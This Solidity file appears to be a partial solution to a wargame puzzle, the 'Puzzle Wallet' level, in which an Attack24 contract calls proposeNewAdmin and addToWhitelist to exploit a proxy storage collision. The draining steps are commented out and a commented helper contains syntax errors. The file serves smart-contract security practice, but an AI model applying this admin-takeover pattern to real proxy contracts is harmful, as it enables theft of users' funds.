// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./24-puzzlewallet.sol";
import "interfaces/ipuzzlewallet.sol";


contract Attack24 {
    PuzzleWallet public target;
    // PuzzleProxy public proxy;

    constructor(address _targetAddress) {
        target = PuzzleWallet(_targetAddress);        
        // proxy = PuzzleProxy(_targetAddress);
    }

    function attack(IPuzzleWallet) public {
        // target.multicall(data);
        target.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));
    }
}


// function encodeCall(address -to, uint256 _amount) external pure returns (bytes memory) {
//     return abi.encodeCall(IERC20.transfer, (to, amount));
// }



